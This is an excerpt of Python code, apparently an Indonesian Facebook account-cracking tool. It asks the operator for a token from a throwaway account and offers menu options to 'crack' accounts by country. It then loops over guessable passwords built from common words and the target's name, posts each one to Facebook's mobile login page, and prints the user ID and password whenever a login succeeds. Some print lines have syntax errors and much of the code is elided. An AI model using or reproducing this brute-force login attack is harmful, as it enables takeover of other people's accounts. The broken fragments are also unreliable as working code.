...
def login():
	os.system('clear')
	print (' '+N+' * tools ini menggunakan login token facebook.\n * apakah kamu sudah tau cara mendapatkan token facebook?\n * ketik %sopen%s untuk mendapatkan token facebook.'%(token))
	token = raw_input('\n '+N+'[?] Token : ')
	if token in ('open', 'Open', 'OPEN'):
		print ('\n '+N+'* note! usahakan akun tumbal login di google chrome terlebih dahulu'%;time.sleep(2)
		print (' '+N+' * jangan lupa! url ubah ke https://m.facebook.com'%;time.sleep(2)
		print (' '+N+' * setelah di alihkan ke google chrome. klik titik tiga'%;time.sleep(2)
		print (' '+N+' * lalu klik Cari di Halaman Tinggal ketik '+H+'EAAA'+N+' Lalu salin.'%;time.sleep(2)
...
def menu():
	...
	print(" "+N+"[3] Crack Usa")
	print(" "+N+"[4] Crack Vietnam")
	print(" "+N+"[5] Check Result")
	print(" "+N+"[6] Setting UserAgent")
...
def indo():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in ['sampang',name.lower()+'12','iloveyou','doraemon','assalamualaikum','katasandi','astaghfirullah','banyumas']:
...
def indbang():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'786786','102030']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+' ' +uid+ '|' +pw+ '                  ')
